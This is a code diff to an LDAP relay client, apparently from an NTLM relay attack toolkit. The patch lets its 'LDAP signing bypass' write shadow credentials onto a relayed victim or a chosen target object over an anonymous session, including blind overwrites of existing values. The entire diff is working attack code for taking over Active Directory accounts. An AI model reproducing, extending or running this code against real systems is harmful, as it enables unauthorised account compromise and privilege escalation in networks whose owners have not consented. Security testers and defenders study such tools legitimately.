@@ -352,9 +352,14 @@ class LDAPRelayClient(ProtocolClient):
         raise LDAPRelayClientException('could not read defaultNamingContext from the DC')
 
     def bypassLookup(self, samaccountname, attributes):
-        entries = self.bypassConnection.search(searchBase=self.baseDN, scope=Scope('wholeSubtree'),
-                                               searchFilter='(sAMAccountName=%s)' % escape_filter_chars(samaccountname),
-                                               attributes=attributes)
+        try:
+            entries = self.bypassConnection.search(searchBase=self.baseDN, scope=Scope('wholeSubtree'),
+                                                   searchFilter='(sAMAccountName=%s)' % escape_filter_chars(samaccountname),
+                                                   attributes=attributes)
+        except LDAPSessionError as e:
+            # An anonymous base session cannot search; the caller must supply the target as a DN
+            LOG.debug('LDAP signing bypass: lookup of %s failed: %s' % (samaccountname, e))
+            return None
         for entry in entries:
             return entry
         return None
@@ -367,8 +372,13 @@ class LDAPRelayClient(ProtocolClient):
         return ldaptypes.LDAP_SID(data=bytes(values[0])).formatCanonical()
 
     def bypassReadAttribute(self, dn, attribute):
-        entries = self.bypassConnection.search(searchBase=dn, scope=Scope('baseObject'),
-                                               searchFilter='(objectClass=*)', attributes=[attribute])
+        try:
+            entries = self.bypassConnection.search(searchBase=dn, scope=Scope('baseObject'),
+                                                   searchFilter='(objectClass=*)', attributes=[attribute])
+        except LDAPSessionError as e:
+            # Our base session cannot read the current value (e.g. anonymous); existing values will be overwritten
+            LOG.warning('LDAP signing bypass: could not read current %s, writing blind (existing values will be replaced): %s' % (attribute, e))
+            return []
         for entry in entries:
             values = get_entry_values(entry, attribute)
             if values:
@@ -435,8 +445,9 @@ class LDAPRelayClient(ProtocolClient):
             return False
 
         self.session = self.bypassConnection
-        LOG.info('LDAP signing bypass: base session opened as %s\\%s' % (
-            self.serverConfig.reauth_domain, self.serverConfig.reauth_user))
+        identity = 'anonymous' if self.serverConfig.reauth_anonymous else '%s\\%s' % (
+            self.serverConfig.reauth_domain, self.serverConfig.reauth_user)
+        LOG.info('LDAP signing bypass: base session opened as %s' % identity)
         return True
 
     def bypassSendNegotiate(self, negotiateMessage):
@@ -467,18 +478,24 @@ class LDAPRelayClient(ProtocolClient):
         authMessage.fromString(token)
         victim = self.victimName(authMessage)
 
-        # The write targets the relayed principal itself, unless --shadow-target names another object
-        target_sam = self.victimSam(authMessage)
+        # Target the relayed principal, or the --shadow-target object (a full DN skips the lookup, so an anonymous base session needs no read)
+        target = self.victimSam(authMessage)
         if self.serverConfig.IsShadowCredentialsAttack and self.serverConfig.ShadowCredentialsTarget:
-            target_sam = self.serverConfig.ShadowCredentialsTarget.split('/')[-1].split('\\')[-1]
+            target = self.serverConfig.ShadowCredentialsTarget
 
         try:
-            entry = self.bypassLookup(target_sam, ['distinguishedName'])
-            if entry is None:
-                LOG.error('LDAP signing bypass: could not resolve %s in the directory', target_sam)
-                return None, STATUS_ACCESS_DENIED
-            self.targetDN = str(entry['objectName'])
-            self.targetSam = target_sam
+            if '=' in target:
+                self.targetDN = target
+                self.targetSam = target.split(',')[0].split('=', 1)[-1]
+            else:
+                sam = target.split('/')[-1].split('\\')[-1]
+                entry = self.bypassLookup(sam, ['distinguishedName'])
+                if entry is None:
+                    LOG.error('LDAP signing bypass: could not resolve %s in the directory '
+                              '(an anonymous base session cannot search; pass --shadow-target as a full DN)', sam)
+                    return None, STATUS_ACCESS_DENIED
+                self.targetDN = str(entry['objectName'])
+                self.targetSam = sam
             attribute, values, operation = self.bypassBuildWrite()
         except (LDAPRelayClientException, LDAPSessionError, NetBIOSError, OSError) as e:
             LOG.error('LDAP signing bypass: %s', e)
@@ -542,7 +559,8 @@ class LDAPRelayClient(ProtocolClient):
             entries = check.search(searchBase=self.targetDN, scope=Scope('baseObject'),
                                    searchFilter='(objectClass=*)', attributes=[attribute])
         except (LDAPSessionError, NetBIOSError, OSError) as e:
-            LOG.error('LDAP signing bypass: read-back verification unavailable: %s' % e)
+            # The Modify result above is authoritative; read-back is only a convenience (it needs a readable session)
+            LOG.info('LDAP signing bypass: read-back verification unavailable: %s' % e)
             return False
         finally:
             if check is not None:
